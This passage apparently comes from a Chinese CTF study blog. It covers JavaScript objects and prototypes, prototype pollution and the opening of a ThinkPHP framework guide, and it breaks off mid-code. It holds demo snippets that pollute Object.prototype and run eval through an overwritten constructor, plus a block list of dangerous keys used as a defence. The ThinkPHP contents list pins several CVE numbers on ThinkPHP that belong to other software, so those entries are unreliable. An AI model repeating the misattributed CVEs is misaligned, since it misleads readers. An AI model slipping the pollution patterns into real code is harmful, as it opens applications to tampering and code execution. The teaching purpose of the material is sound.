binary_data = f.read()<br><br><span class="hljs-comment"># 自定义分析逻辑</span><br>decoded_data = binary_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(decoded_data)<br></code></pre></td></tr></table></figure><h4 id="5-3-复杂的算法题"><a href="#5-3-复杂的算法题" class="headerlink" title="5.3 复杂的算法题"></a>5.3 复杂的算法题</h4><p>CTF比赛中可能涉及复杂的数学、图论或密码学算法。Python内置了丰富的库来解决这些问题，如<code>sympy</code>用于符号计算、<code>numpy</code>用于矩阵计算等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><br>x = sympy.Symbol(<span class="hljs-string">&#x27;x&#x27;</span>)<br>equation = sympy.Eq(x**<span class="hljs-number">2</span> + <span class="hljs-number">2</span>*x - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>)<br>solution = sympy.solve(equation)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解:&quot;</span>, solution)<br></code></pre></td></tr></table></figure><p>！</p><h1 id="2-JavaScript-基础"><a href="#2-JavaScript-基础" class="headerlink" title="2. JavaScript 基础"></a><strong>2. JavaScript</strong> <strong>基础</strong></h1><hr><h2 id="目录-1"><a href="#目录-1" class="headerlink" title="目录"></a>目录</h2><ul><li><p><a href="#1-javascript%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1">1. JavaScript中的对象</a></p><ul><li><a href="#11-%E5%AF%B9%E8%B1%A1%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">1.1 对象基本概念</a></li><li><a href="#12-%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE">1.2 对象的属性访问</a></li></ul></li><li><p><a href="#2-javascript%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0">2. JavaScript中的函数</a></p><ul><li><a href="#21-%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%A1%A8%E8%BE%BE%E5%BC%8F">2.1 函数声明与表达式</a></li><li><a href="#22-%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0">2.2 箭头函数</a></li><li><a href="#23-this-%E5%85%B3%E9%94%AE%E5%AD%97">2.3 <code>this</code> 关键字</a></li></ul></li><li><p><a href="#3-%E5%8E%9F%E5%9E%8B%E4%B8%8E%E7%BB%A7%E6%89%BF">3. 原型与继承</a></p><ul><li><a href="#31-__proto__-%E5%92%8C-%E5%8E%9F%E5%9E%8B%E9%93%BE">3.1 <code>__proto__</code> 和 原型链</a></li><li><a href="#32-constructor">3.2 <code>constructor</code></a></li></ul></li><li><p><a href="#4-%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93prototype-pollution">4. 类型污染（Prototype Pollution）</a></p><ul><li><a href="#41-%E4%BB%80%E4%B9%88%E6%98%AF%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93">4.1 什么是类型污染？</a></li><li><a href="#42-%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93%E7%9A%84%E5%8E%9F%E7%90%86">4.2 类型污染的原理</a></li></ul></li><li><p><a href="#5-__proto__-%E5%92%8C-constructor-%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9">5. <code>__proto__</code> 和 <code>constructor</code> 的安全风险</a></p><ul><li><a href="#51-__proto__-%E6%B3%A8%E5%85%A5">5.1 <code>__proto__</code> 注入</a></li><li><a href="#52-constructor-%E5%92%8C-rce%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">5.2 <code>constructor</code> 和 RCE（远程代码执行）</a></li><li><a href="#53-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">5.3 防御措施</a></li></ul></li></ul><h3 id="1-JavaScript中的对象"><a href="#1-JavaScript中的对象" class="headerlink" title="1. JavaScript中的对象"></a>1. JavaScript中的对象</h3><h4 id="1-1-对象基本概念"><a href="#1-1-对象基本概念" class="headerlink" title="1.1 对象基本概念"></a>1.1 对象基本概念</h4><p>JavaScript中的对象是键值对的集合，用于存储复杂的数据结构。可以通过以下几种方式创建对象：</p><ul><li><p><strong>对象字面量</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,<br>  <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, I am &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>构造函数创建对象</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">25</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(alice.<span class="hljs-property">name</span>);  <span class="hljs-comment">// &quot;Alice&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="1-2-对象的属性访问"><a href="#1-2-对象的属性访问" class="headerlink" title="1.2 对象的属性访问"></a>1.2 对象的属性访问</h4><p>可以通过<strong>点记法</strong>或<strong>方括号记法</strong>来访问对象的属性：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);  <span class="hljs-comment">// 点记法</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person[<span class="hljs-string">&quot;age&quot;</span>]);  <span class="hljs-comment">// 方括号记法</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-JavaScript中的函数"><a href="#2-JavaScript中的函数" class="headerlink" title="2. JavaScript中的函数"></a>2. JavaScript中的函数</h3><h4 id="2-1-函数声明与表达式"><a href="#2-1-函数声明与表达式" class="headerlink" title="2.1 函数声明与表达式"></a>2.1 函数声明与表达式</h4><p>JavaScript中的函数是第一类对象（First-Class Objects），可以作为变量的值、参数传递或返回值。</p><ul><li><p><strong>函数声明</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>函数表达式</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> greet = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-2-箭头函数"><a href="#2-2-箭头函数" class="headerlink" title="2.2 箭头函数"></a>2.2 箭头函数</h4><p>箭头函数是简化的函数声明方式，尤其在处理回调和简短函数时非常有用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="2-3-this-关键字"><a href="#2-3-this-关键字" class="headerlink" title="2.3 this 关键字"></a>2.3 <code>this</code> 关键字</h4><p>在函数内部，<code>this</code>指向调用该函数的对象。在构造函数中，<code>this</code>指向新创建的实例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, I am &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br>alice.<span class="hljs-title function_">greet</span>();  <span class="hljs-comment">// &quot;Hello, I am Alice&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-原型与继承"><a href="#3-原型与继承" class="headerlink" title="3. 原型与继承"></a>3. 原型与继承</h3><p>JavaScript中的对象是通过原型链进行继承的。每个对象都有一个<strong>隐式原型</strong>（<code>[[Prototype]]</code>），可以通过<code>__proto__</code>属性来访问。</p><h4 id="3-1-proto-和-原型链"><a href="#3-1-proto-和-原型链" class="headerlink" title="3.1 __proto__ 和 原型链"></a>3.1 <code>__proto__</code> 和 原型链</h4><p><code>__proto__</code>是JavaScript中对象的原型。通过这个原型链，JavaScript能够在一个对象的祖先链中查找属性和方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;value&quot;</span> &#125;;<br><span class="hljs-keyword">let</span> obj2 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(obj);  <span class="hljs-comment">// 创建一个继承自obj的对象</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2.<span class="hljs-property">key</span>);  <span class="hljs-comment">// 输出 &quot;value&quot;，因为它继承了obj的属性</span><br></code></pre></td></tr></table></figure><p>当访问<code>obj2</code>的<code>key</code>属性时，JavaScript首先在<code>obj2</code>自身查找，如果找不到，则沿着原型链查找<code>obj</code>的属性。</p><h4 id="3-2-constructor"><a href="#3-2-constructor" class="headerlink" title="3.2 constructor"></a>3.2 <code>constructor</code></h4><p><code>constructor</code>是每个对象的属性，指向构造该对象的函数。可以通过<code>constructor</code>创建新实例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(alice.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>);  <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-类型污染（Prototype-Pollution）"><a href="#4-类型污染（Prototype-Pollution）" class="headerlink" title="4. 类型污染（Prototype Pollution）"></a>4. 类型污染（Prototype Pollution）</h3><h4 id="4-1-什么是类型污染？"><a href="#4-1-什么是类型污染？" class="headerlink" title="4.1 什么是类型污染？"></a>4.1 什么是类型污染？</h4><p>类型污染（Prototype Pollution）是一种安全漏洞，攻击者通过修改对象的原型（<code>__proto__</code>）来篡改JavaScript全局对象的行为，从而影响所有继承该原型的对象。这种攻击可以导致权限提升、代码注入等安全问题。</p><h4 id="4-2-类型污染的原理"><a href="#4-2-类型污染的原理" class="headerlink" title="4.2 类型污染的原理"></a>4.2 类型污染的原理</h4><p>因为所有对象通过原型链共享相同的原型，当攻击者篡改全局对象的<code>__proto__</code>时，所有基于该原型创建的对象都会继承被篡改的属性或方法。</p><p><strong>危险操作示例</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">polluted</span> = <span class="hljs-string">&quot;I am polluted!&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// &quot;I am polluted!&quot;</span><br></code></pre></td></tr></table></figure><p>在上例中，攻击者通过修改<code>obj</code>的原型，成功将新的属性<code>polluted</code>注入到了所有对象的原型中。现在，所有新创建的对象都会带有这个“污染”的属性。</p><h4 id="4-3-防御类型污染"><a href="#4-3-防御类型污染" class="headerlink" title="4.3 防御类型污染"></a>4.3 防御类型污染</h4><p>为了防御类型污染，应该避免允许用户直接访问或修改<code>__proto__</code>。如果可能，尽量使用<strong>深拷贝</strong>或者使用框架中的安全库来处理对象操作。</p><p><strong>防御方法</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 检查输入是否是直接的对象属性</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeSet</span>(<span class="hljs-params">obj, key, value</span>) &#123;<br>  <span class="hljs-keyword">if</span> (key !== <span class="hljs-string">&#x27;__proto__&#x27;</span> &amp;&amp; key !== <span class="hljs-string">&#x27;constructor&#x27;</span> &amp;&amp; key !== <span class="hljs-string">&#x27;prototype&#x27;</span>) &#123;<br>    obj[key] = value;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="5-proto-和-constructor-的安全风险"><a href="#5-proto-和-constructor-的安全风险" class="headerlink" title="5. __proto__ 和 constructor 的安全风险"></a>5. <code>__proto__</code> 和 <code>constructor</code> 的安全风险</h3><h4 id="5-1-proto-注入"><a href="#5-1-proto-注入" class="headerlink" title="5.1 __proto__ 注入"></a>5.1 <code>__proto__</code> 注入</h4><p>当不安全地操作<code>__proto__</code>时，攻击者可以通过类型污染来引入恶意属性或方法，造成潜在的安全风险。</p><p><strong>示例：利用<code>__proto__</code>修改全局行为</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is hacked!&quot;</span>;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-title function_">toString</span>());  <span class="hljs-comment">// &quot;This is hacked!&quot;</span><br></code></pre></td></tr></table></figure><h4 id="5-2-constructor-和-RCE（远程代码执行）"><a href="#5-2-constructor-和-RCE（远程代码执行）" class="headerlink" title="5.2 constructor 和 RCE（远程代码执行）"></a>5.2 <code>constructor</code> 和 RCE（远程代码执行）</h4><p><code>constructor</code>也是一个容易被滥用的对象属性。如果攻击者能够控制<code>constructor</code>，可能会注入恶意代码导致RCE。</p><p><strong>危险操作示例</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">constructor</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;alert(&quot;RCE via constructor!&quot;)&#x27;</span>);<br>&#125;;<br><br><span class="hljs-keyword">let</span> x = <span class="hljs-keyword">new</span> obj.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>);  <span class="hljs-comment">// 触发恶意代码执行</span><br></code></pre></td></tr></table></figure><h4 id="5-3-防御措施"><a href="#5-3-防御措施" class="headerlink" title="5.3 防御措施"></a>5.3 防御措施</h4><ul><li><strong>严格限制用户输入</strong>: 检查和过滤用户输入，防止直接操作<code>__proto__</code>或<code>constructor</code>。</li><li><strong>冻结对象原型</strong>: 使用<code>Object.freeze()</code>或<code>Object.seal()</code>来防止对象的原型被修改。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br></code></pre></td></tr></table></figure></li><li><strong>使用安全的对象操作方法</strong>: 避免直接使用<code>__proto__</code>，改用<code>Object.create()</code>等安全的方式创建对象。</li></ul><hr><h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h3><p>JavaScript中的对象、函数、<code>__proto__</code>与<code>constructor</code>机制在CTF和Web安全中扮演着重要角色。CTF选手应当熟悉这些概念，特别是类型污染、原型链的攻击与防御技巧，以应对Web题中常见的安全挑战。</p><h4 id="关键点回顾："><a href="#关键点回顾：" class="headerlink" title="关键点回顾："></a>关键点回顾：</h4><ul><li><p>JavaScript中的对象和函数是基于原型链的，这为类型污染攻击提供了可能。</p></li><li><p><code>__proto__</code>是访问和修改对象原型的入口，容易被滥用。</p></li><li><p><code>constructor</code>不仅用于对象构造，还可能被滥用执行恶意代码。</p></li><li><p>防御类型污染的关键在于输入验证、冻结原型、以及使用安全的对象操作方法。</p></li></ul><h1 id="3-PHP-框架-ThinkPHP"><a href="#3-PHP-框架-ThinkPHP" class="headerlink" title="3. PHP 框架 - ThinkPHP"></a><strong>3. PHP</strong> <strong>框架 - ThinkPHP</strong></h1><h3 id="ThinkPHP-快速入门与完整指南"><a href="#ThinkPHP-快速入门与完整指南" class="headerlink" title="ThinkPHP 快速入门与完整指南"></a>ThinkPHP 快速入门与完整指南</h3><p>本指南将从项目的目录结构开始，涵盖从控制器、路由、数据库操作、视图渲染、表单验证、错误处理、日志记录等常见功能的使用，最后会介绍项目的部署与配置。</p><hr><h3 id="目录-2"><a href="#目录-2" class="headerlink" title="目录"></a>目录</h3><ol><li><p><a href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">目录结构</a></p></li><li><p><a href="#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">快速入门</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E5%99%A8">创建控制器</a></li><li><a href="#%E9%85%8D%E7%BD%AE%E8%B7%AF%E7%94%B1">配置路由</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C">数据库操作</a></li></ul></li><li><p><a href="#%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93">配置数据库</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E6%A8%A1%E5%9E%8B">创建模型</a></li></ul></li><li><p><a href="#%E8%A7%86%E5%9B%BE%E5%92%8C%E6%A8%A1%E6%9D%BF">视图和模板</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E8%A7%86%E5%9B%BE%E6%96%87%E4%BB%B6">创建视图文件</a></li><li><a href="#%E6%B8%B2%E6%9F%93%E8%A7%86%E5%9B%BE">渲染视图</a></li></ul></li><li><p><a href="#%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81">表单验证</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E9%AA%8C%E8%AF%81%E5%99%A8">创建验证器</a></li><li><a href="#%E4%BD%BF%E7%94%A8%E9%AA%8C%E8%AF%81%E5%99%A8">使用验证器</a></li></ul></li><li><p><a href="#%E9%94%99%E8%AF%AF%E5%92%8C%E6%97%A5%E5%BF%97">错误和日志</a></p><ul><li><a href="#%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">错误处理</a></li><li><a href="#%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">日志记录</a></li></ul></li><li><p><a href="#%E9%83%A8%E7%BD%B2">部署</a></p><ul><li><a href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83">配置环境</a></li><li><a href="#%E9%85%8D%E7%BD%AE-web-%E6%9C%8D%E5%8A%A1%E5%99%A8">配置 Web 服务器</a></li></ul></li><li><p><a href="#thinkphp-%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">ThinkPHP 框架架构与基础概念</a></p><ul><li><a href="#%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6">1. 路由机制</a></li></ul><p></p></li><li><p><a href="#thinkphp-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">ThinkPHP 常见的安全漏洞</a></p><ul><li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">1. SQL 注入漏洞</a>  </li><li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">2. 路径遍历漏洞</a>   </li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce">3. 远程代码执行（RCE）</a>  </li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">4. 反序列化漏洞</a></li></ul></li><li><p><a href="#thinkphp-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">ThinkPHP 漏洞利用方法</a></p><ul><li><p><a href="#sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">1. SQL 注入攻击</a>   </p></li><li><p><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB">2. 远程代码执行攻击</a>   </p></li><li><p><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB">3. 路径遍历攻击</a>   </p></li><li><p><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB">4. 反序列化攻击</a></p></li></ul></li><li><p><a href="#thinkphp-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">ThinkPHP 安全防御措施</a></p></li><li><p><a href="#%E7%89%88%E6%9C%AC%E5%8E%86%E5%8F%B2%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">版本历史与漏洞总结</a></p></li><li><p><a href="#ctf-%E9%A2%98%E7%9B%AE%E4%B8%AD%E7%9A%84-thinkphp-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">CTF 题目中的 ThinkPHP 漏洞总结</a></p><ul><li><p><a href="#cve-2018-20062---thinkphp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">1. <strong>CVE-2018-20062</strong> - ThinkPHP 远程代码执行漏洞</a>  </p></li><li><p><a href="#cve-2019-9082---thinkphp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">2. <strong>CVE-2019-9082</strong> - ThinkPHP 远程代码执行漏洞</a>   </p></li><li><p><a href="#cve-2018-19518---thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">3. <strong>CVE-2018-19518</strong> - ThinkPHP 反序列化远程代码执行漏洞</a>  </p></li><li><p><a href="#cve-2018-1000861---thinkphp-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">4. <strong>CVE-2018-1000861</strong> - ThinkPHP 模板注入漏洞</a>   </p></li><li><p><a href="#cve-2019-8018---thinkphp-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">5. <strong>CVE-2019-8018</strong> - ThinkPHP SQL 注入漏洞</a>   </p></li><li><p><a href="#cve-2019-7481---thinkphp-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">6. <strong>CVE-2019-7481</strong> - ThinkPHP 后台文件上传漏洞</a></p></li></ul></li></ol><hr><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>ThinkPHP 的标准项目目录结构如下：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs axapta">application/            <span class="hljs-meta"># 应用目录，包含控制器、模型、视图等</span><br>├── controller/         <span class="hljs-meta"># 控制器目录</span><br>├── model/              <span class="hljs-meta"># 模型目录</span><br>├── view/               <span class="hljs-meta"># 视图目录</span><br>├── <span class="hljs-keyword">common</span>/             <span class="hljs-meta"># 公共目录，存放公共类、函数等</span><br>├── config/             <span class="hljs-meta"># 配置文件目录</span><br>├── route/              <span class="hljs-meta"># 路由配置目录</span><br><span class="hljs-keyword">public</span>/                 <span class="hljs-meta"># Web 公开目录，包含入口文件</span><br>vendor/                 <span class="hljs-meta"># 第三方依赖库（通过 Composer 管理）</span><br>runtime/                <span class="hljs-meta"># 缓存、日志等临时文件目录</span><br>thinkphp/               <span class="hljs-meta"># ThinkPHP 核心框架目录</span><br></code></pre></td></tr></table></figure><ul><li>**application&#x2F;**：存放应用逻辑，如控制器、模型、视图等。</li><li>**public&#x2F;**：存放项目的入口文件（如 <code>index.php</code>）和公开资源。</li><li>**runtime&#x2F;**：用于存放日志、缓存等临时文件。</li><li>**vendor&#x2F;**：使用 Composer 管理的第三方库。</li><li>**thinkphp&#x2F;**：ThinkPHP 框架的核心代码。</li></ul><hr><h3 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h3><h4 id="创建控制器"><a href="#创建控制器" class="headerlink" title="创建控制器"></a>创建控制器</h4><p><strong>控制器</strong> 是 ThinkPHP 处理用户请求的核心部分，负责业务逻辑的处理。控制器文件位于 <code>application/controller/</code> 目录中。</p><ol><li>在 <code>application/controller/</code> 目录下创建控制器文件 <code>Index.php</code>：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> application/controller/Index.php<br></code></pre></td></tr></table></figure><ol start="2"><li>在控制器文件中编写基本代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title 